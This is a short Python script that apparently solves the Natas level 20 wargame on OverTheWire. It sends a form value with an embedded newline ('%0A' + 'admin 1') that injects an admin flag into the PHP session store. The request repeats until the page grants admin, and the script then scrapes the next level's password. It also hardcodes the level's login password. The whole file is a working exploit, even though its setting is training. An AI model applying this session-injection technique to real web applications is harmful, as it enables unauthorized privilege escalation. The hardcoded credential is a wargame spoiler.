import requests
import re
import random
import urllib.parse

def create_cookie():
    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
    sess_id = ""
    for length in range(0,26):
        number = random.randint(0,35)
        sess_id = sess_id + chars[number]
    return sess_id

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    sess_id = create_cookie()
    while True:
        cookie = {
                "Cookie":"PHPSESSID=" + sess_id
                }
        post_data = {
                "name":urllib.parse.unquote("%0A" + "admin 1")
                }
        site = requests.post(url + "index.php?debug",auth=(username,password),data=post_data,headers=cookie) 
        if "You are an admin" in site.text:
            break
    flag = re.findall("Password:(.*)</pre>",site.text)
    print("The flag for natas20 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas20.natas.labs.overthewire.org/"
    username = "natas20"
    password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"
    flag(url,username,password)